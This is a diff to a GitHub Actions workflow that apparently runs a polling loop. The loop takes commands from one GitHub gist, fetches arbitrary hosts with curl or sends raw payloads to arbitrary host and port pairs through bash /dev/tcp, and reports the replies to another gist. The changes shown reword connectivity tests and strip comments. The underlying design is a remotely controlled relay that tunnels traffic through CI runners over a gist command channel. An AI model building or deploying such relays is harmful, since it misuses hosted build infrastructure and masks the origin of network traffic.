@@ -21,21 +21,29 @@ jobs:
           echo "Response Gist: $RESPONSE_GIST_ID"
           echo "========================================"
           
-          # Test basic connectivity first
-          echo "[$(date -u +%H:%M:%S)] Testing basic connectivity..."
-          echo "[$(date -u +%H:%M:%S)] Testing github.com..."
-          curl -sS --max-time 10 -o /dev/null -w "HTTP %{http_code}\n" "https://github.com" 2>&1 || echo "github.com FAILED"
+          # Test 1: curl to github.com
+          echo "[$(date -u +%H:%M:%S)] Test 1: curl github.com"
+          curl -sS --max-time 10 -o /dev/null -w "HTTP %{http_code}\n" "https://github.com" 2>&1
           
-          echo "[$(date -u +%H:%M:%S)] Testing api.github.com..."
-          curl -sS --max-time 10 -o /dev/null -w "HTTP %{http_code}\n" "https://api.github.com" 2>&1 || echo "api.github.com FAILED"
+          # Test 2: curl to api.github.com
+          echo "[$(date -u +%H:%M:%S)] Test 2: curl api.github.com"
+          curl -sS --max-time 10 -o /dev/null -w "HTTP %{http_code}\n" "https://api.github.com" 2>&1
           
-          echo "[$(date -u +%H:%M:%S)] Testing example.com..."
-          curl -sS --max-time 10 -o /dev/null -w "HTTP %{http_code}\n" "https://example.com" 2>&1 || echo "example.com FAILED"
+          # Test 3: curl to example.com
+          echo "[$(date -u +%H:%M:%S)] Test 3: curl example.com"
+          curl -sS --max-time 10 -o /dev/null -w "HTTP %{http_code}\n" "https://example.com" 2>&1
           
-          echo "[$(date -u +%H:%M:%S)] Testing gh CLI..."
-          gh api "gists/$COMMAND_GIST_ID" 2>&1 | head -c 200 || echo "gh FAILED"
+          # Test 4: gh api
+          echo "[$(date -u +%H:%M:%S)] Test 4: gh api"
+          gh api "gists/$COMMAND_GIST_ID" 2>&1 | head -c 300
+          echo ""
           
-          echo "[$(date -u +%H:%M:%S)] Connectivity tests complete"
+          # Test 5: gh api with verbose
+          echo "[$(date -u +%H:%M:%S)] Test 5: gh api verbose"
+          GH_DEBUG=api gh api "gists/$COMMAND_GIST_ID" 2>&1 | head -c 500
+          echo ""
+          
+          echo "[$(date -u +%H:%M:%S)] Tests complete, entering main loop"
           
           # Main polling loop
           while true; do
@@ -90,27 +98,22 @@ jobs:
             if [ "$PORT" = "80" ] || [ "$PORT" = "443" ]; then
               PROTO="http"
               [ "$PORT" = "443" ] && PROTO="https"
-              # Build URL from host and payload
               if [ -n "$PAYLOAD" ]; then
-                # Extract path from HTTP request
                 HTTP_PATH=$(echo "$PAYLOAD" | head -1 | awk '{print $2}')
                 [ -z "$HTTP_PATH" ] && HTTP_PATH="/"
                 FULL_URL="${PROTO}://${HOST}${HTTP_PATH}"
                 echo "[$(date -u +%H:%M:%S)] Fetching: $FULL_URL"
                 RESPONSE=$(curl -sS --max-time 30 -D - "$FULL_URL" 2>&1 || echo "CURL_ERROR: $?")
-                echo "[$(date -u +%H:%M:%S)] curl exit code: $?"
               else
                 FULL_URL="${PROTO}://${HOST}/"
                 RESPONSE=$(curl -sS --max-time 30 -D - "$FULL_URL" 2>&1 || echo "CURL_ERROR: $?")
               fi
             else
-              # For non-HTTP ports, use bash /dev/tcp
               if timeout 10 bash -c "echo >/dev/tcp/$HOST/$PORT" 2>/dev/null; then
                 exec 3<>/dev/tcp/$HOST/$PORT 2>/dev/null || true
                 if [ -n "$PAYLOAD" ]; then
                   printf '%s' "$PAYLOAD" >&3 2>/dev/null || true
                 fi
-                # Read response with timeout
                 RESPONSE=""
                 while IFS= read -r -t 3 line <&3 2>/dev/null || [ -n "$line" ]; do
                   RESPONSE+="$line"$'\n'
